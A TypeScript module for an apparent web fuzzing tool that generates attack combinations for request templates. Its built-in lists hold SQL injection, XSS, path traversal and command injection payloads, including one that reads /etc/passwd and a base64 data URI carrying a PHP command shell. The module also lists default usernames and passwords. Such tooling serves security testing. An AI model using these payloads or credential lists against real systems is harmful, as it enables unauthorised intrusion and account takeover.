/**
 * Payload Engine Service
 * Generates payloads for fuzzing/intruder attacks
 */

export type PayloadType =
  | 'simple_list'
  | 'numbers'
  | 'sqli'
  | 'xss'
  | 'lfi'
  | 'command_injection'
  | 'custom';

export type AttackType = 'sniper' | 'battering_ram' | 'pitchfork' | 'cluster_bomb';

export interface PayloadSet {
  id: string;
  name: string;
  type: PayloadType;
  payloads: string[];
}

export interface NumberRangeConfig {
  from: number;
  to: number;
  step: number;
}

export interface PayloadPosition {
  id: string;
  start: number;
  end: number;
  payloadSetId: string;
}

/**
 * Payload Engine
 */
export class PayloadEngine {
  /**
   * Built-in Payload Sets
   */
  private static readonly BUILTIN_PAYLOADS = {
    // SQL Injection
    sqli: [
      "' OR '1'='1",
      "' OR '1'='1' --",
      "' OR '1'='1' #",
      "' OR '1'='1'/*",
      "admin'--",
      "admin' #",
      "admin'/*",
      "' or 1=1--",
      "' or 1=1#",
      "' or 1=1/*",
      "') or '1'='1--",
      "') or ('1'='1--",
      "1' ORDER BY 1--+",
      "1' ORDER BY 2--+",
      "1' ORDER BY 3--+",
      "1' UNION SELECT NULL--",
      "1' UNION SELECT NULL,NULL--",
      "1' UNION SELECT NULL,NULL,NULL--",
    ],

    // XSS (Cross-Site Scripting)
    xss: [
      '<script>alert(1)</script>',
      '<img src=x onerror=alert(1)>',
      '<svg onload=alert(1)>',
      '<iframe src="javascript:alert(1)">',
      '<body onload=alert(1)>',
      '<input onfocus=alert(1) autofocus>',
      '<marquee onstart=alert(1)>',
      '<details open ontoggle=alert(1)>',
      '"><script>alert(1)</script>',
      "'><script>alert(1)</script>",
      '<img src=x onerror="alert(String.fromCharCode(88,83,83))">',
      '<svg/onload=alert(1)>',
      '<iframe src=javascript:alert(1)>',
      'javascript:alert(1)',
      '<img src=x:alert(1) onerror=eval(src)>',
    ],

    // LFI/RFI (Local/Remote File Inclusion)
    lfi: [
      '../../../etc/passwd',
      '..\\..\\..\\windows\\system32\\drivers\\etc\\hosts',
      '....//....//....//etc/passwd',
      '..%2F..%2F..%2Fetc%2Fpasswd',
      '..%252F..%252F..%252Fetc%252Fpasswd',
      '/etc/passwd',
      '../../../../../../../../etc/passwd',
      'php://filter/convert.base64-encode/resource=index.php',
      'php://input',
      'expect://id',
      'data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7Pz4=',
    ],

    // Command Injection
    command_injection: [
      '| id',
      '; id',
      '& id',
      '&& id',
      '| whoami',
      '; whoami',
      '& whoami',
      '&& whoami',
      '`id`',
      '$(id)',
      '| ls',
      '; ls',
      '| cat /etc/passwd',
      '; cat /etc/passwd',
      '| ping -c 5 127.0.0.1',
    ],

    // Common usernames
    usernames: [
      'admin',
      'administrator',
      'root',
      'test',
      'user',
      'demo',
      'guest',
      'info',
      'support',
      'webmaster',
      'sales',
      'contact',
      'api',
      'service',
      'system',
    ],

    // Common passwords
    passwords: [
      'password',
      '123456',
      '12345678',
      'admin',
      'password123',
      'qwerty',
      'letmein',
      'welcome',
      'admin123',
      'root',
      'test',
      'pass',
      'password1',
      '123456789',
      '1234567890',
    ],
  };

  /**
   * Generate payloads from a simple list
   */
  static generateSimpleList(items: string[]): string[] {
    return [...items];
  }

  /**
   * Generate number range payloads
   */
  static generateNumberRange(config: NumberRangeConfig): string[] {
    const payloads: string[] = [];
    const { from, to, step } = config;

    for (let i = from; i <= to; i += step) {
      payloads.push(i.toString());
    }

    return payloads;
  }

  /**
   * Get built-in payload set
   */
  static getBuiltinPayloads(type: PayloadType): string[] {
    switch (type) {
      case 'sqli':
        return this.BUILTIN_PAYLOADS.sqli;
      case 'xss':
        return this.BUILTIN_PAYLOADS.xss;
      case 'lfi':
        return this.BUILTIN_PAYLOADS.lfi;
      case 'command_injection':
        return this.BUILTIN_PAYLOADS.command_injection;
      default:
        return [];
    }
  }

  /**
   * Generate attack combinations based on attack type
   */
  static generateAttackCombinations(
    attackType: AttackType,
    payloadSets: PayloadSet[]
  ): string[][] {
    if (payloadSets.length === 0) {
      return [];
    }

    switch (attackType) {
      case 'sniper':
        return this.generateSniperCombinations(payloadSets);
      case 'battering_ram':
        return this.generateBatteringRamCombinations(payloadSets);
      case 'pitchfork':
        return this.generatePitchforkCombinations(payloadSets);
      case 'cluster_bomb':
        return this.generateClusterBombCombinations(payloadSets);
      default:
        return [];
    }
  }

  /**
   * Sniper: Use one payload set, iterate through each position one at a time
   * Position 1: [A, B, C], Position 2: [D, E, F]
   * Results: [A, §], [B, §], [C, §], [§, D], [§, E], [§, F]
   */
  private static generateSniperCombinations(payloadSets: PayloadSet[]): string[][] {
    const combinations: string[][] = [];

    payloadSets.forEach((set, positionIndex) => {
      set.payloads.forEach((payload) => {
        const combination = payloadSets.map((s, idx) => (idx === positionIndex ? payload : '§'));
        combinations.push(combination);
      });
    });

    return combinations;
  }

  /**
   * Battering Ram: Use same payload for all positions simultaneously
   * Position 1: [A, B, C], Position 2: (same)
   * Results: [A, A], [B, B], [C, C]
   */
  private static generateBatteringRamCombinations(payloadSets: PayloadSet[]): string[][] {
    const combinations: string[][] = [];

    // Use first payload set for all positions
    const firstSet = payloadSets[0];

    firstSet.payloads.forEach((payload) => {
      const combination = payloadSets.map(() => payload);
      combinations.push(combination);
    });

    return combinations;
  }

  /**
   * Pitchfork: Iterate through payload sets in parallel
   * Position 1: [A, B, C], Position 2: [D, E, F]
   * Results: [A, D], [B, E], [C, F]
   */
  private static generatePitchforkCombinations(payloadSets: PayloadSet[]): string[][] {
    const combinations: string[][] = [];

    // Find minimum length
    const minLength = Math.min(...payloadSets.map((set) => set.payloads.length));

    for (let i = 0; i < minLength; i++) {
      const combination = payloadSets.map((set) => set.payloads[i]);
      combinations.push(combination);
    }

    return combinations;
  }

  /**
   * Cluster Bomb: Test all possible combinations (Cartesian product)
   * Position 1: [A, B], Position 2: [D, E]
   * Results: [A, D], [A, E], [B, D], [B, E]
   */
  private static generateClusterBombCombinations(payloadSets: PayloadSet[]): string[][] {
    if (payloadSets.length === 0) return [];
    if (payloadSets.length === 1) return payloadSets[0].payloads.map((p) => [p]);

    const cartesianProduct = (a: string[][], b: string[]): string[][] => {
      const result: string[][] = [];
      a.forEach((aItem) => {
        b.forEach((bItem) => {
          result.push([...aItem, bItem]);
        });
      });
      return result;
    };

    let result: string[][] = payloadSets[0].payloads.map((p) => [p]);

    for (let i = 1; i < payloadSets.length; i++) {
      result = cartesianProduct(result, payloadSets[i].payloads);
    }

    return result;
  }

  /**
   * Replace payload markers (§) in template with actual payloads
   */
  static applyPayloadsToTemplate(template: string, positions: PayloadPosition[], payloads: string[]): string {
    let result = template;

    // Sort positions by start index (descending) to replace from end to beginning
    const sortedPositions = [...positions].sort((a, b) => b.start - a.start);

    sortedPositions.forEach((position, index) => {
      const payload = payloads[positions.length - 1 - index] || '';
      result = result.substring(0, position.start) + payload + result.substring(position.end);
    });

    return result;
  }

  /**
   * Calculate total requests for campaign
   */
  static calculateTotalRequests(attackType: AttackType, payloadSets: PayloadSet[]): number {
    const combinations = this.generateAttackCombinations(attackType, payloadSets);
    return combinations.length;
  }
}

export const payloadEngine = new PayloadEngine();
